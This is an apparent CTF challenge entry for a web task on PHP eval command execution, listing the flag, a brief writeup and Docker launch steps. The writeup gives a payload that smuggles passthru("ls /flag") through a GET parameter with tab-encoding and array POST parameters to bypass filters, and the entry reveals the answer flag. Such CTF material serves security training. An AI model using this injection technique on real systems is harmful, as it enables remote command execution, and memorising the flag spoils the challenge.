- **题目名称：** eval_eval_我的
- **题目类型：** WEB（23）
- **题目难度：** 容易
- **出题人：** itSssm3
- **考点：**

1. 命令执行绕过

- **描述：** 总是在做别人的eval 我吃醋啦！0.o 这次evaleval我的吧~
- **flag：** XSCTF{YoU_F1NalLy_EvaLLL_m3!!}
- **Writeup：** 

payload如下

```
GET:
?xsctf=passthru("ls%09/flag");;
POST:
Xp0int[]=1&Sloth[]=2
```

- ### **容器启动方式：** 
* #### cd build/docker
* #### docker-compose up -d